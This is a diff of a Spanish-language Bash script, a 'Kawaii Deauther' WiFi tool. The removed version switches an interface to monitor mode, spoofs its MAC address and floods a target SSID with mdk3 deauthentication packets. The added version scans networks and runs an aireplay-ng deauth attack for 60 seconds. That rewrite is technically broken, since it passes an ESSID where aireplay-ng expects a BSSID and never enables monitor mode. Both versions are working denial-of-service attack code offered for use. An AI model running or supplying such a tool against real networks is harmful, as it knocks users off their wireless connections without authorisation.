@@ -1,122 +1,57 @@
 #!/bin/bash
 
-# Kawaii Deauther WiFi Auditing Tool
-# Author: Juan Perez 
-# Description: Script para auditoría de WiFi mediante ataques de denegación de servicio
+# Constants
+RED="\033[1;31m"
+GREEN="\033[1;32m"  
+WHITE="\033[1;37m"
 
-# Constantes
-readonly BK="\e[0m"    # Negro
-readonly GR="\e[32m"   # Verde
-readonly RD="\e[31m"   # Rojo
-readonly YW="\e[33m"   # Amarillo  
-readonly WH="\e[37m"   # Blanco
+# Get available WiFi networks
+get_wifi_networks(){
 
-# Imprime el banner
-print_banner() {
-  cat <<_BANNER_ 
-        ${BK}${GR}
-                                 @@@        @   @
-                                @@@@       @@@
-             @@@@@@@    @@@@   @@@@       @@@@@
-            @@@@@@@@@  @@@@@@@ @@@@       @@@@@@@
-              @@@@         @@@@ @@@@       @@@@
-               @@@          @@@ @@@@       @@@
+  echo -e "${WHITE}Buscando redes WiFi disponibles...${GREEN}\n"
 
-_BANNER_
-}
+  networks=($(sudo iwlist wlan0 scan | grep ESSID | awk '{print $2}'))
 
-# Selecciona una interfaz de red
-get_interface() {
+  echo -e "${WHITE}Redes encontradas:\n"
 
-  ifaces=($(ifconfig | grep mtu | awk '{print $1}'))
-
-  echo -e "${WH} Interfaces disponibles: "
-  
-  for ((i=0; i<${#ifaces[@]}; i++)); do
-    echo -e "${GR}$((i+1))). ${ifaces[$i]}"
+  for ((i=0; i<${#networks[@]}; i++)); do
+    echo -e "${RED}$i) ${networks[$i]}"
   done
 
-  read -p "Seleccione una interfaz: " selection
+}
 
-  [[ $selection -lt 1 || $selection -gt ${#ifaces[@]} ]] && 
-    { echo -e "${RD} ¡Interfaz inválida!"; get_interface; }
+# Deauth attack function
+deauth_attack(){
   
-  iface=${ifaces[$selection-1]}
-  echo -e "${WH} Interfaz seleccionada: ${GR}$iface"
-}
+  read -p "Ingresa el número de red a atacar: " target  
+  ssid=${networks[target]}
 
-# Activa el modo monitor en la interfaz
-monitor_mode() {
+  echo -e "\n${RED}Atacando red ${WHITE}$ssid ${RED}- Comenzando ataque Deauth...${WHITE}\n"
 
-  ifconfig $1 down
-  iwconfig $1 mode monitor
-  macchanger -r $1
-  ifconfig $1 up
+  timeout 60s aireplay-ng -0 0 -a $ssid wlan0
+
+  echo -e "\n${RED}Ataque Deauth finalizado! ${WHITE}"
   
-  echo -e "${WH}[${GR}+${WH}] ${GR}Se activó el modo monitor en ${WH}$1"
-
 }
 
-# Desactiva el modo monitor
-managed_mode() {
-
-  ifconfig $1 down
-  iwconfig $1 mode managed
-  macchanger -p $1
-  ifconfig $1 up  
-
-  echo -e "${WH}[${RD}-${WH}] ${RD}Se desactivó el modo monitor en ${WH}$1" 
-
-}
-
-# Ataque de denegación de servicio a una SSID
-attack_ssid() {
-  
-  read -p "Ingresa el SSID a atacar: " ssid
-  monitor_mode $iface  
-
-  echo -e "${RD}¡COMENZANDO ATAQUE! ${YW}ヽ(゚Д゚)ノ"
-
-  mdk3 $iface d -n $ssid
-
-  managed_mode $iface
-
-  echo -e "${RD}¡ATAQUE FINALIZADO! ${YW}~(=^..^)丿"  
-
-}
-
-# Muestra el menú interactivo 
-show_menu() {
-
-  print_banner
-  echo -e "${WH} MENÚ PRINCIPAL"
-  echo -e "${WH} 1) Ataque a SSID"
-  echo -e "${WH} 2) Salir"
-
-  read -p "Seleccione una opción: " option
-
-}
-
-# Programa principal
-iface="wlan0"
-
+# Main menu
 while :; do
 
-  show_menu
+    clear
+    get_wifi_networks
+    echo -e "\n1) Ataque Deauth a SSID"
+    echo -e "2) Salir"
+    read -p "Opción: " option
 
-  case $option in
-  
-    1) 
-      attack_ssid
-      ;;
-
-    2)
-      echo -e "${WH} ¡Hasta luego! (^_^)/"
-      break  
-      ;;  
-
-    *)
-      echo -e "${RD} ¡Opción inválida!${WH}"
-  esac  
+    case $option in
+     1)
+       deauth_attack
+       ;;
+     2) 
+       exit 0 
+       ;;
+     *)
+       echo -e "${RED}Opción inválida${WHITE}\n"
+    esac
 
 done
